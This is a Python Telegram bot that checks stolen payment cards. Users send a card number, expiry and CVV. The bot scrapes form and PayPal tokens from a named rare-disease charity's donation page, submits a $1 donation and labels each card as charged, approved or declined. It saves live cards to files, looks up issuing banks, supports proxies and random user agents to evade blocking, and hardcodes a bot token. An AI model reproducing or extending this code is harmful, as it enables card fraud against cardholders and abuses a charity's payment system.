import telebot, base64, re, time, os, json, threading, hashlib, requests, datetime, queue
import urllib3
urllib3.disable_warnings()

from requests_toolbelt.multipart.encoder import MultipartEncoder
from user_agent import generate_user_agent
from concurrent.futures import ThreadPoolExecutor

# ========================= CONFIG =========================
BOT_TOKEN = '8783810252:AAEv2GtOJYG_-iBv1AMjvV8Le3kZBo9FJb0'   # Your Token
ADMIN_ID = 7077294261                                         # ← YOUR ID ADDED

FREE_LIMIT = 0
PREMIUM_LIMIT = 1000
MAX_RETRIES = 3
USE_PROXY = False
PROXY_FILE = "proxy.txt"

# Files
USERS_FILE = 'Data/users.txt'
PREMIUM_FILE = 'Data/premium.txt'
BANNED_FILE = 'Data/banned.txt'
STATS_FILE = 'stats.json'
CHARGED_FILE = 'Data/charged.txt'
APPROVED_FILE = 'Data/approved.txt'

os.makedirs('Data', exist_ok=True)
for f in [USERS_FILE, PREMIUM_FILE, BANNED_FILE, APPROVED_FILE, CHARGED_FILE]:
    if not os.path.exists(f):
        open(f, 'w').close()

if not os.path.exists(STATS_FILE):
    with open(STATS_FILE, 'w') as f:
        json.dump({"charged": 0, "approved": 0, "total_users": 0, "premium_users": 0, "banned_users": 0}, f)

bot = telebot.TeleBot(BOT_TOKEN)

# ====================== CACHES ======================
PREMIUM_CACHE = {}
BANNED_CACHE = {}
STATS_LOCK = threading.Lock()

ACTIVE_JOBS = {}
ACTIVE_USERS_PP = {}
ACTIVE_USERS_MPP = {}
USER_ACTIVE_JOB = {}

def load_cache():
    global PREMIUM_CACHE, BANNED_CACHE
    PREMIUM_CACHE.clear()
    BANNED_CACHE.clear()
    try:
        with open(PREMIUM_FILE, 'r') as f:
            for line in f:
                if '|' in line:
                    uid, exp = line.strip().split('|', 1)
                    PREMIUM_CACHE[uid] = 0 if exp == '0' else float(exp)
    except: pass

    try:
        with open(BANNED_FILE, 'r') as f:
            for line in f:
                if '|' in line:
                    uid, exp = line.strip().split('|', 1)
                    BANNED_CACHE[uid] = 0 if exp == '0' else float(exp)
    except: pass

load_cache()

def is_admin(uid): return uid == ADMIN_ID

def is_premium(uid):
    uid = str(uid)
    if uid in PREMIUM_CACHE:
        exp = PREMIUM_CACHE[uid]
        return exp == 0 or time.time() < exp
    return False

def is_banned(uid):
    uid = str(uid)
    if uid in BANNED_CACHE:
        exp = BANNED_CACHE[uid]
        return exp == 0 or time.time() < exp
    return False

def get_stats():
    with STATS_LOCK:
        try:
            with open(STATS_FILE, 'r') as f:
                return json.load(f)
        except:
            return {"charged": 0, "approved": 0, "total_users": 0, "premium_users": 0, "banned_users": 0}

def save_stats(stats):
    with STATS_LOCK:
        try:
            with open(STATS_FILE, 'w') as f:
                json.dump(stats, f)
        except: pass

def save_unique_cc(filepath, cc, note):
    cc_num = cc.split('|')[0].strip()
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            if cc_num in f.read(): return
    except: pass
    with open(filepath, 'a', encoding='utf-8') as f:
        f.write(f"{cc} - {note}\n")

def get_bin_info(bin_code):
    try:
        res = requests.get(f"https://bins.antipublic.cc/bins/{bin_code}", timeout=10)
        if res.status_code == 200:
            data = res.json()
            return (
                data.get('brand', 'UNKNOWN'),
                data.get('bank', 'UNKNOWN'),
                data.get('country_name', 'UNKNOWN'),
                data.get('level', 'N/A'),
                data.get('type', 'N/A')
            )
    except: pass
    return "UNKNOWN", "UNKNOWN", "UNKNOWN", "N/A", "N/A"

# ====================== CHECKER ======================
def check_cc(ccx, proxy=None):
    try:
        ccx = ccx.strip()
        parts = ccx.split("|")
        if len(parts) < 4:
            return "ERROR", "Invalid Format"

        n, mm, yy, cvc = parts[0], parts[1].zfill(2), parts[2][-2:], parts[3].strip()

        us = generate_user_agent()
        session = requests.Session()
        session.verify = False
        if proxy:
            session.proxies.update(proxy)

        headers = {'User-Agent': us}
        r = session.get('https://www.rarediseasesinternational.org/donate/', headers=headers, timeout=25)

        if 'cf-ray' in r.headers or r.status_code == 403:
            return "ERROR", "Cloudflare Block"

        m1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', r.text)
        m2 = re.search(r'name="give-form-id" value="(.*?)"', r.text)
        m3 = re.search(r'name="give-form-hash" value="(.*?)"', r.text)
        m4 = re.search(r'"data-client-token":"(.*?)"', r.text)

        if not all([m1, m2, m3, m4]):
            return "ERROR", "Page Load Error"

        id1, id2, hashv, token = m1.group(1), m2.group(1), m3.group(1), m4.group(1)
        dec = base64.b64decode(token).decode('utf-8')
        au_match = re.search(r'"accessToken":"(.*?)"', dec)
        if not au_match:
            return "ERROR", "Token Error"
        au = au_match.group(1)

        data = MultipartEncoder({
            'give-honeypot': '', 'give-form-id-prefix': id1, 'give-form-id': id2,
            'give-form-hash': hashv, 'give-amount': '1', 'give-gateway': 'paypal-commerce',
            'payment-mode': 'paypal-commerce', 'give_first': 'xunarch', 'give_last': 'xunarch',
            'give_email': 'xunarch@gmail.com'
        })

        resp = session.post(
            'https://www.rarediseasesinternational.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order',
            headers={'Content-Type': data.content_type, 'User-Agent': us},
            data=data, timeout=20
        )
        order_id = resp.json()['data']['id']

        session.post(
            f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source',
            json={'payment_source': {'card': {'number': n, 'expiry': f'20{yy}-{mm}', 'security_code': cvc}}},
            headers={'Authorization': f'Bearer {au}', 'Content-Type': 'application/json', 'User-Agent': us},
            timeout=20
        )

        final_resp = session.post(
            f'https://www.rarediseasesinternational.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_approve_order&order={order_id}',
            headers={'Content-Type': data.content_type, 'User-Agent': us},
            data=data, timeout=20
        )

        text = final_resp.text.upper()

        if any(k in text for k in ['APPROVED', 'SUCCESS', 'THANK YOU', 'CHARGE', 'PROCESSED']):
            if 'ERROR' not in text:
                return "CHARGED", "Thank you for donation"

        if 'INSUFFICIENT_FUNDS' in text: return "APPROVED", "INSUFFICIENT_FUNDS"
        if any(x in text for x in ['CVV', 'SECURITY_CODE', 'INVALID']): return "APPROVED", "CVV_FAILED"
        if '3D' in text or 'OTP' in text: return "APPROVED", "3D_REQUIRED"

        return "DECLINED", "Transaction Declined"

    except Exception as e:
        msg = str(e).lower()
        if 'timeout' in msg: return "ERROR", "Timeout"
        if 'proxy' in msg or 'connection' in msg: return "ERROR", "Proxy Error"
        return "ERROR", f"Req Error: {str(e)[:40]}"

# ====================== START ======================
@bot.message_handler(commands=['start'])
def start(message):
    uid = message.from_user.id
    if is_banned(uid):
        return bot.reply_to(message, "𝗬𝗼𝘂 𝗮𝗿𝗲 𝗕𝗮𝗻𝗻𝗲𝗱!")

    with open(USERS_FILE, 'a+') as f:
        f.seek(0)
        if str(uid) not in f.read():
            f.write(str(uid) + '\n')
            s = get_stats()
            s["total_users"] += 1
            save_stats(s)

    fname = message.from_user.first_name or "User"
    bot.reply_to(message, f"👋 Welcome {fname}!\n\nUse /pp to check cards\nDev: @Xoarch")

# ====================== SINGLE CHECK ======================
@bot.message_handler(commands=['pp'])
def pp(message):
    uid = message.from_user.id
    if is_banned(uid):
        return bot.reply_to(message, "𝗬𝗼𝘂 𝗮𝗿𝗲 𝗕𝗮𝗻𝗻𝗲𝗱!")

    if ACTIVE_USERS_PP.get(uid):
        return bot.reply_to(message, "⏳ Already checking!")

    try:
        cc = message.text.split(maxsplit=1)[1]
        if len(cc.split('|')) < 4:
            raise ValueError
    except:
        return bot.reply_to(message, "❌ Format: /pp 4111111111111111|04|28|123")

    ACTIVE_USERS_PP[uid] = True
    msg = bot.reply_to(message, "🔄 Checking...")

    status, response = "ERROR", "N/A"
    for _ in range(MAX_RETRIES):
        status, response = check_cc(cc)
        if status != "ERROR":
            break

    bin_code = cc[:6]
    brand, bank, country, level, ctype = get_bin_info(bin_code)

    status_font = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥" if status == "CHARGED" else "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅" if status == "APPROVED" else "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"

    if status == "CHARGED":
        s = get_stats()
        s["charged"] += 1
        save_stats(s)
        save_unique_cc(CHARGED_FILE, cc, response)
    elif status == "APPROVED":
        s = get_stats()
        s["approved"] += 1
        save_stats(s)
        save_unique_cc(APPROVED_FILE, cc, response)

    result = f"""
𝐂𝐚𝐫𝐝 ➜ <code>{cc}</code>
𝐒𝐭𝐚𝐭𝐮𝐬 ➜ {status_font}
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜ {response}
━━━━━━━━━━━
𝐁𝐫𝐚𝐧𝐝 ➜ {brand} - {ctype}
𝐁𝐚𝐧𝐤 ➜ {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➜ {country}
━━━━━━━━━━━
Checked By: {message.from_user.first_name}
"""
    try:
        bot.edit_message_text(result, message.chat.id, msg.message_id, parse_mode="HTML")
    except:
        bot.reply_to(message, result, parse_mode="HTML")

    ACTIVE_USERS_PP[uid] = False

if __name__ == "__main__":
    print("🚀 Bot Started Successfully!")
    print(f"Admin ID: {ADMIN_ID}")
    bot.infinity_polling()
